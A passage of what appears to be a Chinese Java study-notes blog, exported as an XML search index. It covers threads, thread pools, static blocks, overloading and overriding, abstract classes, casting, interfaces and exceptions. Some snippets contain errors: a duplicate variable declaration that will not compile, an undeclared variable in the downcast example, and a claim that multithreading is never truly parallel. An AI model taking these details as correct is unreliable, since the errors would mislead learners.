href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>所谓的多线程是多个线程交替占用CPU资源，而非真正的并行执行-</p><p>在Java中创建线程：继承 <code>java.lang.Thread</code> 类或者实现 <code>java.lang.Runnable</code> 接口</p><blockquote><p>在通过实现 <code>java.lang.Runnable</code> 接口创建线程时，我们定义的线程类中并没有<code>start()</code>方法，还需要调用<code>Thread</code>类中的带参构造方法将<code>Runnable</code> 接口的实现类包装成一个<code>Thread</code>对象才可以进行调用<code>start()</code>方法</p></blockquote><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><p>多个线程访问同一个资源时，会引发数据不安全的问题</p><p><code>synchronized</code>修饰符：对于被修饰的方法，<code>synchronized</code>就是为当前线程声明一个锁，将被修饰的方法视为一个整体。对于使用<code>synchronized</code>关键字修饰的代码块，相比<code>synchronized</code>同步的范围更小，仅同步被修饰的代码块</p><table><thead><tr><th>类型名称</th><th>线程是否安全</th><th>效率比较</th><th>适合场景</th></tr></thead><tbody><tr><td><code>Vector</code></td><td>是</td><td>低</td><td>多线程并发共享资源</td></tr><tr><td><code>ArrayList</code></td><td>否</td><td>高</td><td>单线程</td></tr><tr><td><code>Hashtable</code></td><td>是</td><td>低</td><td>多线程并发共享资源</td></tr><tr><td><code>HashMap</code></td><td>否</td><td>高</td><td>单线程</td></tr></tbody></table><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><p>Java线程池是一种实现多线程编程的机制，它可以帮助我们有效地管理和调度多个线程，从而提高程序的性能和效率</p><blockquote><p>Java线程池的使用步骤：</p><p>创建线程池：使用 <code>java.util.concurrent.Executors</code> 类中的静态方法创建线程池</p><p>创建任务：创建实现 <code>Runnable</code> 或 <code>Callable</code> 接口的任务</p><p>提交任务：使用线程池的 <code>submit()</code> 方法提交任务，也可以使用 <code>execute()</code> 方法提交 <code>Runnable</code> 任务</p><p>关闭线程池：使用线程池的 <code>shutdown()</code> 或 <code>shutdownNow()</code> 方法关闭线程池</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleThreadPool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 创建线程池（2个线程）</span></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">pool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 2. 提交5个任务</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">taskId</span> <span class="operator">=</span> i;</span><br><span class="line">            pool.execute(() -&gt; &#123;</span><br><span class="line">                <span class="comment">// 简单输出：哪个线程执行哪个任务</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; -&gt; Task &quot;</span> + taskId);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 关闭线程池</span></span><br><span class="line">        pool.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <br/>]]></content>
      
      
      <categories>
          
          <category> 零碎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面向对象基础词条</title>
      <link href="/2025/12/03/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E8%AF%8D%E6%9D%A1/"/>
      <url>/2025/12/03/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E8%AF%8D%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Java面向对象基础词条"><a href="#Java面向对象基础词条" class="headerlink" title="Java面向对象基础词条"></a>Java面向对象基础词条</h1><br/><h2 id="static代码块"><a href="#static代码块" class="headerlink" title="static代码块"></a>static代码块</h2><p>在一个类中，我们可以定义若干个static代码块</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> num=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        num+=<span class="number">100</span>;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        num+=<span class="number">500</span>;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JVM加载类时，会加载静态代码块，如有多个则按顺序加载，每个代码块只会被执行一次，静态代码块的加载和对象的创建没有关系</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在main函数中</span></span><br><span class="line">StaticTest st1=<span class="keyword">new</span> <span class="title class_">StaticTest</span>();</span><br><span class="line">StaticTest st1=<span class="keyword">new</span> <span class="title class_">StaticTest</span>(); <span class="comment">//不会有输出，类通常只会被加载一次</span></span><br><span class="line">System.out.println(num); </span><br><span class="line"><span class="comment">//输出:</span></span><br><span class="line"><span class="comment">//200</span></span><br><span class="line"><span class="comment">//700</span></span><br><span class="line"><span class="comment">//700</span></span><br></pre></td></tr></table></figure><p> <strong>主动使用类的7种情况(会触发类加载和静态代码块)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TriggerConditions</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=== 各种触发情况 ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建类的实例</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TriggerDemo</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 访问类的静态变量（非常量）</span></span><br><span class="line">        System.out.println(TriggerDemo.staticField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 调用类的静态方法</span></span><br><span class="line">        TriggerDemo.staticMethod();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 使用反射</span></span><br><span class="line">        Class.forName(<span class="string">&quot;TriggerDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 初始化子类（会先初始化父类）</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ChildClass</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 作为启动类（包含main方法的类）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7. 某些反射调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TriggerDemo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">staticField</span> <span class="operator">=</span> <span class="string">&quot;静态字段&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;TriggerDemo静态代码块执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParentClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ParentClass静态代码块执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChildClass</span> <span class="keyword">extends</span> <span class="title class_">ParentClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ChildClass静态代码块执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="实例代码块"><a href="#实例代码块" class="headerlink" title="实例代码块"></a>实例代码块</h2><p>实例代码块是没有<code>static</code>修饰的代码块，在每次创建对象时执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// 实例代码块</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;实例代码块执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化MyClass时输出:</span></span><br><span class="line"><span class="comment">//实例代码块执行</span></span><br><span class="line"><span class="comment">//构造方法执行</span></span><br></pre></td></tr></table></figure><p><strong>执行顺序</strong>：父类实例代码块 → 父类构造方法 → 子类实例代码块 → 子类构造方法</p><br/><h2 id="static修饰符"><a href="#static修饰符" class="headerlink" title="static修饰符"></a>static修饰符</h2><p>凡是被<code>static</code>修饰的变量、方法、代码块，这些都属于类本身，不属于对象，但对象可以访问这些static成员，所有对象共享一个static成员，修改这些static成员会影响所有对象</p><table><thead><tr><th align="left">方面</th><th align="left">static成员</th><th align="left">实例成员</th></tr></thead><tbody><tr><td align="left"><strong>归属</strong></td><td align="left">属于类</td><td align="left">属于对象</td></tr><tr><td align="left"><strong>内存位置</strong></td><td align="left">方法区&#x2F;元空间</td><td align="left">堆内存</td></tr><tr><td align="left"><strong>加载时机</strong></td><td align="left">类加载时</td><td align="left">对象创建时</td></tr><tr><td align="left"><strong>生命周期</strong></td><td align="left">程序运行期间</td><td align="left">对象存在期间</td></tr><tr><td align="left"><strong>访问方式</strong></td><td align="left"><code>类名.成员</code></td><td align="left"><code>对象.成员</code></td></tr><tr><td align="left"><strong>共享性</strong></td><td align="left">所有对象共享</td><td align="left">每个对象独立</td></tr><tr><td align="left"><strong>对象能否访问</strong></td><td align="left">可以（不推荐）</td><td align="left">可以（必须）</td></tr><tr><td align="left"><strong>类能否直接访问</strong></td><td align="left">可以</td><td align="left">不可以</td></tr></tbody></table><br/><h2 id="方法重载和方法重写"><a href="#方法重载和方法重写" class="headerlink" title="方法重载和方法重写"></a>方法重载和方法重写</h2><table><thead><tr><th align="left">对比维度</th><th align="left">方法重载 (Overload)</th><th align="left">方法重写 (Override)</th></tr></thead><tbody><tr><td align="left"><strong>定义</strong></td><td align="left">同一个类中，多个方法<strong>名称相同但参数不同</strong></td><td align="left">子类中重新定义父类的<strong>同名同参数</strong>方法</td></tr><tr><td align="left"><strong>位置关系</strong></td><td align="left">同一个类中，或父子类之间</td><td align="left">只能在父子类之间（继承关系）</td></tr><tr><td align="left"><strong>方法签名</strong></td><td align="left"><strong>必须不同</strong>（参数类型、个数、顺序至少一个不同）</td><td align="left"><strong>必须完全相同</strong>（方法名和参数列表）</td></tr><tr><td align="left"><strong>返回类型</strong></td><td align="left">可以不同，但<strong>仅返回类型不同不能构成重载</strong></td><td align="left">必须相同，或是父类返回类型的<strong>子类</strong>（协变返回）</td></tr><tr><td align="left"><strong>访问修饰符</strong></td><td align="left">可以不同，没有限制</td><td align="left"><strong>不能更严格</strong>（可以更宽松）</td></tr><tr><td align="left"><strong>异常声明</strong></td><td align="left">可以不同，没有限制</td><td align="left"><strong>不能抛出更宽泛</strong>的检查异常 可以抛出相同、更具体或不抛出异常</td></tr><tr><td align="left"><strong>static&#x2F;final</strong></td><td align="left">可以重载static&#x2F;final方法</td><td align="left"><strong>不能重写</strong>final方法 static方法只能<strong>隐藏</strong>，不是重写</td></tr><tr><td align="left"><strong>private方法</strong></td><td align="left">可以重载private方法</td><td align="left"><strong>不能重写</strong>（子类不可见）</td></tr><tr><td align="left"><strong>绑定时机</strong></td><td align="left"><strong>编译时绑定</strong>（静态绑定、早期绑定）</td><td align="left"><strong>运行时绑定</strong>（动态绑定、晚期绑定）</td></tr><tr><td align="left"><strong>多态性</strong></td><td align="left"><strong>编译时多态</strong>（静态多态）</td><td align="left"><strong>运行时多态</strong>（动态多态）</td></tr><tr><td align="left"><strong>性能</strong></td><td align="left">编译时确定，性能较好</td><td align="left">运行时确定，稍有性能开销</td></tr><tr><td align="left"><strong>@Override注解</strong></td><td align="left">不需要，通常不使用</td><td align="left"><strong>强烈建议使用</strong>，让编译器检查是否正确重写</td></tr><tr><td align="left"><strong>调用机制</strong></td><td align="left">编译器根据<strong>参数列表</strong>决定调用哪个方法</td><td align="left">JVM根据<strong>对象的实际类型</strong>决定调用哪个方法</td></tr><tr><td align="left"><strong>设计目的</strong></td><td align="left">提供<strong>多种方式</strong>处理不同类型&#x2F;数量的数据</td><td align="left"><strong>修改&#x2F;扩展</strong>父类行为，实现多态</td></tr><tr><td align="left"><strong>应用场景</strong></td><td align="left">构造函数重载、工具方法多种形式</td><td align="left">框架设计、模板方法模式、多态实现</td></tr></tbody></table> <br/><h2 id="super访问父类成员"><a href="#super访问父类成员" class="headerlink" title="super访问父类成员"></a>super访问父类成员</h2><p><strong>super不可以访问父类的私有成员</strong></p><p>若要用super访问父类构造，只能在子类构造中使用，且须出现在第1行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 父类构造方法1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal无参构造方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;未知动物&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.age = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 父类构造方法2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal有参构造方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String breed;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 子类构造方法1：调用父类无参构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();  <span class="comment">// 调用父类Animal()，可以省略（编译器自动添加）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Dog无参构造方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.breed = <span class="string">&quot;未知品种&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子类构造方法2：调用父类有参构造</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, <span class="type">int</span> age, String breed)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);  <span class="comment">// 必须放在第一行！</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Dog有参构造方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.breed = breed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><p> Object类是所有类的父类，任何类都默认继承自Object类，以下两个方法常被重写</p><p>toString方法：返回当前对象本身的有关信息，按字符串返回，内容为类的全名称和内存地址</p><p>equals方法：比较两个对象地址是否相同，是则返回true，相当于<code>==</code></p><blockquote><p><code>==</code>在比较简单数据类型时直接比较值，比较引用类型时则判断两者是否为同一对象（地址）</p></blockquote><blockquote><p>一个字符串变量a在进行a.equals(“A”)运算的本质也是调用了equals方法，但这个方法在String类进行了改写，只比较内容是否相同</p></blockquote> <br/><h2 id="抽象类和抽象方法"><a href="#抽象类和抽象方法" class="headerlink" title="抽象类和抽象方法"></a>抽象类和抽象方法</h2><p>被<code>abstract</code>修饰的类或方法就是抽象类或抽象方法</p><blockquote><p>抽象类中可以有非抽象方法</p><p>抽象方法必须在抽象类中</p><p>抽象方法没有方法体</p><p>抽象方法必须在子类中被实现,除非子类是抽象类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象类：动物</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="comment">// 属性（可以有非抽象的属性和方法）</span></span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 抽象方法：动物发出声音（没有方法体）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 抽象方法：动物如何进食</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 具体方法：所有动物都会睡觉</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在睡觉...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 具体方法：获取信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">displayInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物: &quot;</span> + name + <span class="string">&quot;, 年龄: &quot;</span> + age + <span class="string">&quot;岁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体子类：狗</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String breed;  <span class="comment">// 特有属性：品种</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name, <span class="type">int</span> age, String breed)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(name, age);  <span class="comment">// 调用父类构造方法</span></span><br><span class="line">        <span class="built_in">this</span>.breed = breed;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 必须实现父类的抽象方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃狗粮&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 可以添加特有方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;开心地摇尾巴&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="final修饰符"><a href="#final修饰符" class="headerlink" title="final修饰符"></a>final修饰符</h2><blockquote><p>final修饰的类不能有子类</p><p>final修饰的方法不能被重写</p><p>final修饰的变量会变成常量</p></blockquote> <br/><h2 id="向上转型和向下转型"><a href="#向上转型和向下转型" class="headerlink" title="向上转型和向下转型"></a>向上转型和向下转型</h2><h3 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h3><p>自动隐式转换，总是安全</p><p><strong>语法</strong>：<code>Parent p = new Child();</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物吃东西&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;汪汪叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhyCasting</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Animal</span> <span class="variable">animal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();  <span class="comment">// 只知道是Animal，不知道具体类型</span></span><br><span class="line">        animal.eat();   <span class="comment">//  可以</span></span><br><span class="line">        animal.bark();  <span class="comment">//  编译错误！编译器只知道它是Animal</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h3><p>需要调用子类特有方法，而引用是父类类型时，需要显式强制转换，可能不安全</p><p><strong>语法</strong>：<code>Child c = (Child) p;</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;动物吃东西&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;汪汪叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WhyCasting</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> (Dog) animal;  <span class="comment">// 强制转换：我确定animal是Dog</span></span><br><span class="line">        dog2.eat();   <span class="comment">//  可以</span></span><br><span class="line">        dog2.bark();  <span class="comment">//  可以</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <br/><h2 id="for增强循环（for-each循环）"><a href="#for增强循环（for-each循环）" class="headerlink" title="for增强循环（for-each循环）"></a>for增强循环（for-each循环）</h2><p>基本语法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (元素类型 元素变量 : 集合或数组) &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <br/><h2 id="接口-Interface"><a href="#接口-Interface" class="headerlink" title="接口(Interface)"></a>接口(Interface)</h2><p>接口是类似于一种合约，接口内部定义了一些列的抽象方法，当实现类采用了某一个接口就必须实现该接口中的所有方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 支付接口，包含默认方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PaymentProcessor</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 抽象方法：处理支付（必须由实现类实现）</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">processPayment</span><span class="params">(<span class="type">double</span> amount)</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 抽象方法：获取支付方式名称</span></span><br><span class="line">    String <span class="title function_">getPaymentMethod</span><span class="params">()</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 默认方法：生成交易ID（所有支付方式通用的逻辑）</span></span><br><span class="line">    <span class="keyword">default</span> String <span class="title function_">generateTransactionId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;TXN&quot;</span> + System.currentTimeMillis() + (<span class="type">int</span>)(Math.random() * <span class="number">1000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;生成的交易ID: &quot;</span> + id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取支持的货币</span></span><br><span class="line">    <span class="keyword">static</span> String[] getSupportedCurrencies() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;CNY&quot;</span>, <span class="string">&quot;USD&quot;</span>, <span class="string">&quot;EUR&quot;</span>, <span class="string">&quot;JPY&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java8以后，接口中可以有默认方法，默认方法可以具有方法体</p></blockquote><h3 id="接口数组"><a href="#接口数组" class="headerlink" title="接口数组"></a>接口数组</h3><p>接口数组可以容纳调用了该接口的实现类的实例化对象</p> <br/><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>异常是程序中可能中断程序运行的事件，异常处理可以预先设置好异常的处理方法，异常发生时程序可以正常运行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:执行可能产生异常的代码</span><br><span class="line"><span class="keyword">catch</span>:捕获异常</span><br><span class="line"><span class="keyword">finally</span>:无论是否发生异常，代码总能执行</span><br><span class="line"><span class="keyword">throws</span>:声明方法可能要抛出的异常，要求调用者处理</span><br><span class="line"><span class="keyword">throw</span>:手动抛出异常</span><br></pre></td></tr></table></figure><h3 id="异常对象-Exception"><a href="#异常对象-Exception" class="headerlink" title="异常对象(Exception)"></a>异常对象(Exception)</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Throwable (所有异常/错误的超类)</span><br><span class="line">    ├── Error (严重错误，程序无法处理)</span><br><span class="line">    │    ├── OutOfMemoryError</span><br><span class="line">    │    ├── StackOverflowError</span><br><span class="line">    │    └── ...</span><br><span class="line">    │</span><br><span class="line">    └── Exception (程序可以处理的异常)</span><br><span class="line">         ├── RuntimeException (运行时异常，非受检异常)</span><br><span class="line">         │    ├── NullPointerException</span><br><span class="line">         │    ├── IndexOutOfBoundsException</span><br><span class="line">         │    ├── ArithmeticException</span><br><span class="line">         │    └── ...</span><br><span class="line">         │</span><br><span class="line">         └── 其他Exception (受检异常，编译报错)</span><br><span class="line">              ├── IOException</span><br><span class="line">              ├── SQLException</span><br><span class="line">              └── ...</span><br></pre></td></tr></table></figure><p> 异常的本质也是一种对象</p><table><thead><tr><th>异常对象</th><th>描述</th></tr></thead><tbody><tr><td>InputMismatchException</td><td>类型异常</td></tr><tr><td>ArithmeticException</td><td>算数异常</td></tr><tr><td>Exception</td><td>其他异常</td></tr></tbody></table><p>异常也有自己的方法</p><table><thead><tr><th>异常方法</th><th>描述</th></tr></thead><tbody><tr><td>void printStackTrace()</td><td>输出异常的堆栈信息</td></tr><tr><td>String getMessage()</td><td>返回异常信息的描述字符串，是printStackTrace()输出的一部分</td></tr></tbody></table><h3 id="try-catch-finally结构"><a 